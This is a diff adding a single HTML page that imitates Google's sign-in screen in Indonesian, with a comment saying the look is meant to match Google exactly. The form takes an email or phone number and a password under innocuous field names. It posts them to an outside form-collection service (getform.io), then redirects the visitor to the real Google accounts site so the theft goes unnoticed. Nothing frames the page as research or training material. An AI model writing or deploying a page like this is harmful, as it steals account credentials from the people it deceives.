@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        /* Ini biar tampilannya persis Google */
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; }
+        .box { width: 350px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px 30px; text-align: center; }
+        h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
+        p { font-size: 16px; margin-bottom: 25px; }
+        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 20px; }
+        .google-logo { width: 75px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo">
+    <h1>Login</h1>
+    <p>Gunakan Akun Google Anda</p>
+
+    <form action="https://getform.io/f/aroxnvxb" method="POST">
+        
+        <input type="text" name="kontak" placeholder="Email atau ponsel" required>
+        <input type="password" name="pesan" placeholder="Masukkan sandi Anda" required>
+
+        <input type="hidden" name="_next" value="https://accounts.google.com">
+
+        <button type="submit">Berikutnya</button>
+    </form>
+    </div>
+
+</body>
+</html>
